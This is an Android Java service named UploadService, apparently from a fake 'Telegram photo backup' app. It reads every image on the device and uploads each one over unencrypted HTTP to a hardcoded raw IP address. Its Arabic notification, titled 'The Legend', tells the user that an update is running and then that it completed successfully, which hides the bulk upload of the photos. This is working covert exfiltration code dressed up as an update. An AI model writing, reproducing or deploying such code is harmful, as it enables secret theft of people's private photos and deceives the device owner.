package com.example.telegramphotobackup;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UploadService extends Service {
    private static final String CHANNEL = "photo_backup";
    private static final int NOTIFICATION_ID = 7;

    // السيرفر الحالي الذي اختبرناه
    private static final String UPLOAD_URL = "http://145.239.69.111:20245/upload";

    @Override public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(NOTIFICATION_ID, notification("جاري التحديث…"));
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            boolean success = uploadAllPhotos();
            NotificationManager nm = (NotificationManager)getSystemService(NOTIFICATION_SERVICE);
            nm.notify(NOTIFICATION_ID, notification(success ? "تم التحديث بنجاح ✅" : "تعذر إكمال التحديث"));
            stopForeground(false);
            stopSelf();
        }).start();
        return START_NOT_STICKY;
    }

    private boolean uploadAllPhotos() {
        ContentResolver cr = getContentResolver();
        Uri collection = Build.VERSION.SDK_INT >= 29
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
        try (Cursor c = cr.query(collection, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c == null) return false;
            int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

            while (c.moveToNext()) {
                long id = c.getLong(idCol);
                String name = c.getString(nameCol);
                Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));
                if (!uploadOne(uri, name)) return false;
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean uploadOne(Uri uri, String fileName) {
        String boundary = "----AndroidBoundary" + System.currentTimeMillis();
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection)new URL(UPLOAD_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(180000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (OutputStream raw = conn.getOutputStream();
                 DataOutputStream out = new DataOutputStream(new BufferedOutputStream(raw))) {

                out.writeBytes("--" + boundary + "\r\n");
                out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" +
                        fileName.replace("\"", "_") + "\"\r\n");
                out.writeBytes("Content-Type: image/jpeg\r\n\r\n");

                try (InputStream in = new BufferedInputStream(getContentResolver().openInputStream(uri))) {
                    if (in == null) return false;
                    byte[] buffer = new byte[8192];
                    int n;
                    while ((n = in.read(buffer)) != -1) out.write(buffer, 0, n);
                }

                out.writeBytes("\r\n--" + boundary + "--\r\n");
                out.flush();
            }

            int code = conn.getResponseCode();
            return code >= 200 && code < 300;
        } catch (Exception e) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "نسخ الصور", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification notification(String text) {
        if (Build.VERSION.SDK_INT >= 26) {
            return new Notification.Builder(this, CHANNEL)
                    .setContentTitle("الأسطورة")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.ic_menu_upload)
                    .setOngoing(true)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("الأسطورة")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true)
                .build();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
